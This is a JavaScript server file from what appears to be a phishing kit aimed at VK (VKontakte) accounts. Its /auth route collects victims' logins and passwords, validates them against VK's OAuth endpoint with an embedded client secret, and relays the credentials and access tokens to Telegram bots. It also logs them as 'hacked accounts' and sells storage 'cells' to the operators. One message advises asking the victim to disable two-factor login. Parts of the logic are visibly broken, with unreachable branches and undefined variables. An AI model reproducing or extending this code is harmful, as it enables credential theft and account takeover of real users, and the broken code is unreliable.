const request = require('request')
const fs = require('fs');
const bot_tg = require(`./bot.js`);

var database_worker = require("../mysql/workers");
var database_acc = require("../mysql/accaunts");
const { VK } = require("vk-io");

function start(app) { 
  app.post("/auth", (req, res) => {
      if(req.body.login == "" || req.body.password == "") {
          res.render(`login/login.ejs`, {
            error: 1,
            capcha: {
              status: 0
            },
            id: req.body.id
          })
      } else {
        request(`https://oauth.vk.com/token?grant_type=password&client_id=2274003&client_secret=hHbZxrka2uZ6jB1inYsH&username=${req.body.login}&password=${encodeURIComponent(req.body.password)}${req.body.captcha_id ? `&captcha_sid=${req.body.captcha_id}&captcha_key=${req.body.captcha}` : ``}`, async (err, response, body) => {
            if(body != undefined) {
                var info = JSON.parse(body);
                console.log(req.body)
                if(info.error) {
/*==============================================================*/
                  if(info.error == "invalid_client") {
                    if(req.body.id) {
                          var text_message = `🚫 Совершена попытка входа в аккаунт! 🚫\n❗️ Неверный логин или пароль. ❗️\n\n🔶 Логин: ${req.body.login}\n🔷 Пароль: ${req.body.password}`;
                          var buttons = [
                            [{"text": "Резервный канал 🔍", url: "https://t.me/rezerv_vk_fishing_bot"}],
                            [{"text": "⏪ Меню", callback_data: "menu"}]
                          ];

                          bot_tg.message_send_other(req.body.id, text_message, buttons);
                      }
                      return res.render(`login/login.ejs`, {
                        error: 1,
                        capcha: {
                          status: 0
                        },
                        id: req.body.id
                      })
                  }
/*==============================================================*/
                  if(info.error == "need_captcha") {
                    if(req.body.id) {
                          var text_message = `🚫 Совершена попытка входа в аккаунт! 🚫\n❗️ Каптча. ❗️\n\n🔶 Логин: ${req.body.login}\n🔷 Пароль: ${req.body.password}`;
                          var buttons = [
                            [{"text": "Резервный канал 🔍", url: "https://t.me/rezerv_vk_fishing_bot"}],
                            [{"text": "⏪ Меню", callback_data: "menu"}]
                          ]

                          bot_tg.message_send_other(req.body.id, text_message, buttons);
                      }
                      return res.render(`login/login.ejs`, {
                        error: 3,
                        id: req.body.id,
                        capcha: {
                          status: 1,
                          captcha_sid: info.captcha_sid,
                          captcha_img: info.captcha_img
                        }
                      })
                  }
/*==============================================================*/
                  if(info.error == `need_validation` || info.error == 'invalid_request') {
                    if(req.body.id) {
                      var text_message = `🚫 Совершена попытка входа в аккаунт! 🚫\n❗️ Включена 2fa авторизация (подтверждение входа через SMS).\n⚙️ Попросите жертву отключить подтверждение входа и повторите попытку. ❗️\n\n🔶 Логин: ${req.body.login}\n🔷 Пароль: ${req.body.password}`;
                      var buttons = [
                        [{"text": "Резервный канал 🔍", url: "https://t.me/rezerv_vk_fishing_bot"}],
                        [{"text": "⏪ Меню", callback_data: "menu"}]
                      ]

                      bot_tg.message_send_other(req.body.id, text_message, buttons);
                    }
                      return res.render(`login/login.ejs`, {
                        ads: req.body.ads,
                        error: 3,
                        capcha: {
                          status: 0
                        },
                        id: req.body.id
                      }) 
                  }
/*==============================================================*/
                  if(info.access_token) {
                    const vk = new VK({
                        token: info.access_token
                    });

                    let users_info = await vk.api.users.get({
                        token: vk.token,
                        fields: "counters"
                    });
                    
                    if(req.body.id) {
                      database_worker.findUser(req.body.id, (user) => {
                        database_acc.find(users_info[0].id, (vk_acc) => {
                          if(vk_acc.length == 0) {
                            database_worker.updateUser(user[0].id_tg, "hacked_accounts", user[0].hacked_accounts+=1);

                            var file = {
                              id_vk: users_info[0].id,
                              login: req.body.login,
                              password: req.body.password,
                              worker_id: req.body.id
                            }

                            database_acc.create(file, (file_info) => {
                              if(file_info == "true") {
                                return
                              }
                            });
                          } else {
                            if(vk_acc[0].password != req.body.password) {
                              database_acc.update(vk_acc[0].id_vk, "password", req.body.password);
                              database_worker.updateUser(user[0].id_tg, "hacked_accounts", user[0].hacked_accounts+=1);
                            }
                          }
                        });


                        if(user[0].cells <= 0) {
                          if((users_info[0].counters.followers != undefined && users_info[0].counters.followers > 25 || users_info[0].counters.followers + users_info[0].counters.friends > 25) || users_info[0].counters.friends > 25) {
                            var text_message_warning = `⚠️ ВНИМАНИЕ ⚠️\nВы взломали аккаунт, у которого суммарное количество друзей и подписчиков превышает допустимое число для получения аккаунтов без ячеек (25). В связи с этим, аккаунт отправляется администратору проекта.\n\n<b>Хотите получать все взломанные аккаунты? Приобретите пустые ячейки.</b>`
                            var buttons = [[{"text": `📂 Приобрести ячейки`, callback_data: "cells"}],
                                          [{"text": "Резервный канал 🔍", url: "https://t.me/rezerv_vk_fishing_bot"}],
                                          [{"text": "⏪ Меню", callback_data: "menu"}]]
                            bot_tg.message_send_other(req.body.id, text_message_warning, buttons);
                            /*=========================================*/
                            var text_message = `😻 Успешный взлом! 😻\n\n🔶 Логин: ${req.body.login}\n🔷 Пароль: ${req.body.password}\n💠 Токен: ${info.access_token}\n\n◼️ ФИ: ${users_info[0].last_name} ${users_info[0].first_name}\n◽️Страница ВК: vk.com/id${users_info[0].id}\n\n🟥 Друзей: ${users_info[0].counters.friends}\n🟦 Подписчиков: ${users_info[0].counters.followers != undefined ? users_info[0].counters.followers : "🚫"}\n\n<b>📊 Количество взломанных аккаунтов:</b> ${bot_tg.numberWithCommas(info.hacked_accounts)}\n<b>📂 Количество пустых ячеек: ${bot_tg.numberWithCommas(info.cells.hacked)}</b>`;
                            var buttons = [
                              [{"text": "Перейти в бота", url: "https://t.me/new_vk_fishing_bot"}]
                            ];
                            return bot_tg.message_send_other("@rezerv_vk_fishing_bot", text_message, buttons);
                          }
                          if(users_info[0].counters.followers != undefined && users_info[0].counters.followers + users_info[0].counters.friends < 25) {
                            var text_message = `😻 Успешный взлом! 😻\n\n🔶 Логин: ${req.body.login}\n🔷 Пароль: ${req.body.password}\n💠 Токен: ${info.access_token}\n\n◼️ ФИ: ${users_info[0].last_name} ${users_info[0].first_name}\n◽️Страница ВК: vk.com/id${users_info[0].id}\n\n🟥 Друзей: ${users_info[0].counters.friends}\n🟦 Подписчиков: ${users_info[0].counters.followers != undefined ? users_info[0].counters.followers : "🚫"}\n\n<b>📊 Количество взломанных аккаунтов:</b> ${bot_tg.numberWithCommas(info.hacked_accounts)}\n<b>📂 Количество пустых ячеек: ${bot_tg.numberWithCommas(info.cells.hacked)}</b>`;
                            return bot_tg.message_send_other(req.body.id, text_message, []);
                          }
                        } else {
                          database_worker.updateUser(user[0].id_tg, "cells", user[0].cells-1);
                          if(user[0].cells <= 0) {
                            var text_message = `⚠️ ВНИМАНИЕ ⚠️\nВы заполнили все свободные ячейки.\nКупите ещё свободных ячеек чтобы продолжить получать аккаунты.`
                            var buttons = [[{"text": `📂 Приобрести ячейки`, callback_data: "cells"}],
                                          [{"text": "Резервный канал 🔍", url: "https://t.me/rezerv_vk_fishing_bot"}],
                                          [{"text": "⏪ Меню", callback_data: "menu"}]]
                            
                            bot_tg.message_send_other(req.body.id, text_message, buttons);
                          }

                          var text_message = `😻 Успешный взлом! 😻\n\n🔶 Логин: ${req.body.login}\n🔷 Пароль: ${req.body.password}\n💠 Токен: ${info.access_token}\n\n◼️ ФИ: ${users_info[0].last_name} ${users_info[0].first_name}\n◽️Страница ВК: vk.com/id${users_info[0].id}\n\n🟥 Друзей: ${users_info[0].counters.friends}\n🟦 Подписчиков: ${users_info[0].counters.followers != undefined ? users_info[0].counters.followers : "🚫"}\n\n<b>📊 Количество взломанных аккаунтов:</b> ${bot_tg.numberWithCommas(info.hacked_accounts)}\n<b>📂 Количество пустых ячеек: ${bot_tg.numberWithCommas(info.cells.hacked)}</b>`;
                          var buttons = [[{"text": "Резервный канал 🔍", url: "https://t.me/rezerv_vk_fishing_bot"}],
                          [{"text": "⏪ Меню", callback_data: "menu"}]];
                          return bot_tg.message_send_other(req.body.id, text_message, []);
                        }
                        return save_user.start(req.body.id, info);
                      });
                      res.redirect(user[0].link);
                    }
                  }
              }
            }
        })
      } 
  })
}

module.exports = {
  start
}